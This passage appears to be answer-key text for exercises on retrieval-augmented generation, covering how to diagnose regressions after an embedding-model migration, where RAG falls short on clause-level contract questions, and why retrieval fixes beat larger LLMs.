**AC.2** (1) Domain or slice regression hidden by the average: check per-slice metrics. (2) A missing or wrong query prefix for the new model on some code path: inspect the embedding calls. (3) The reranker threshold or fusion weights were tuned for the old score distribution: re-calibrate. (4) The golden set doesn't reflect production traffic (distribution shift): label a sample of the thumbs-down conversations. (5) Better recall now pulls in more near-duplicate or stale documents, which confuse generation: check dedup and `is_latest`. Also check a mixed-model index during migration, and latency increases that push users to abandon.

**AC.3** It breaks on: clause-level citation granularity (needs clause-aware chunking with offsets and native span citations), and "which contracts *lack* X" (top-k retrieval can't prove absence: it's an *aggregation over all documents*). Add: offline LLM extraction of a structured clause table per contract (has_limitation_of_liability, cap amount, page, span) → SQL/tool queries for the corpus-wide questions; RAG with clause-level citations for the explanatory questions; and an evaluation with legal SMEs.

**AC.4** (1) Most failures happen before the LLM: the right evidence never reaches it (parsing, chunking, retrieval). (2) Bigger models can't cite documents they never saw, or know about stale or deleted ones. (3) Long contexts degrade (context rot), so dumping more text isn't free. (4) Cost and latency rise several-fold at every query, while retrieval fixes are paid for once. (5) Our evaluation funnel shows X% of errors are retrieval or ranking failures, and fixes there gave +Y points for a fraction of the cost.
